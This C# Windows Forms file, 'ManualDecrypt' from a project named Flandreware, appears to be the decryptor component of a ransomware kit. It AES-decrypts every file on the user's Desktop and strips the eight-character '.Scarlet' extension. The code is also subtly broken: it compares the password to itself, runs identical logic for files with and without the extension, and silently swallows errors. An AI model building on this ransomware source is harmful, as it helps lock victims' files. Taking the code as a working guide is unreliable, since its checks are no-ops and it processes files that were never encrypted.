using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Flandreware
{
    public partial class ManualDecrypt : Form
    {
		private Crypto CryptoFunctions = new Crypto();
		public ManualDecrypt()
        {
			Console.Write("Hello Debuger User :");//
			InitializeComponent();
        }

		private void ManualDecrypt_Load(object sender, EventArgs e)
		{
			Console.Write("Hello Debuger User :");//
			string fullPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			foreach (string file in Directory.GetFiles(fullPath))
			{
				Console.Write("Hello Debuger User :"	);//
				FileInfo fileInfo = new FileInfo(file);
				float num = (float)fileInfo.Length / 1024f / 1024f;

				ListViewItem listViewItem = new ListViewItem(file);
				listViewItem.SubItems.Add(fileInfo.Extension);
				listViewItem.SubItems.Add(num.ToString());

				listViewItem.SubItems.Add("待機");
				this.listView1.Items.Add(listViewItem);
			}
			for (int j = 0; j < this.listView1.Items.Count; j++)
			{
				int jj = 0;
				bool flag = this.listView1.Items[j].SubItems[1].Text == ".Scarlet";
				if (!flag)
				{
				
					try
					{
			
						bool flag2 = this.PasswordTXT.Text != "";
						if (flag2)
						{
							bool flag3 = this.PasswordTXT.Text == this.PasswordTXT.Text;
							if (flag3)
							{
								
								byte[] bytesToBeDecrypted = File.ReadAllBytes(listView1.Items[j].SubItems[0].Text);
								byte[] passwordBytes = Encoding.UTF8.GetBytes(this.PasswordTXT.Text);
								passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
								byte[] bytesDecrypted = CryptoFunctions.AES_Decrypt(bytesToBeDecrypted, passwordBytes);
								string file = listView1.Items[j].SubItems[0].Text.Remove(listView1.Items[j].SubItems[0].Text.Length - 8);
								File.WriteAllBytes(file, bytesDecrypted);
								listView1.Items[j].SubItems[3].Text = "復号化";
								this.listView1.Items[j].BackColor = Color.LimeGreen;
							}
							else
							{
								MessageBox.Show("パスワードの確認が取れませんでした。");
							}
						}
						else
						{
							MessageBox.Show("パスワードを設定してください", "エラー");
						}
					}
					catch (Exception ex)
					{

					}
                }
                else
                {
					try
					{
						bool flag2 = this.PasswordTXT.Text != "";
						if (flag2)
						{
							bool flag3 = this.PasswordTXT.Text == this.PasswordTXT.Text;
							if (flag3)
							{
								byte[] bytesToBeDecrypted = File.ReadAllBytes(listView1.Items[j].SubItems[0].Text);
								byte[] passwordBytes = Encoding.UTF8.GetBytes(this.PasswordTXT.Text);
								passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
								byte[] bytesDecrypted = CryptoFunctions.AES_Decrypt(bytesToBeDecrypted, passwordBytes);
								string file = listView1.Items[j].SubItems[0].Text.Remove(listView1.Items[j].SubItems[0].Text.Length - 8);
								File.WriteAllBytes(file, bytesDecrypted);
								listView1.Items[j].SubItems[3].Text = "復号化";
								this.listView1.Items[j].BackColor = Color.LimeGreen;
							}
							else
							{
								MessageBox.Show("パスワードの確認が取れませんでした。");
							}
						}
						else
						{
							MessageBox.Show("パスワードを設定してください", "エラー");
						}
					}
					catch (Exception ex)
					{
                        MessageBox.Show("Ilove Flandre Scarlet");
                    }
				}
			}
		}
    }
}
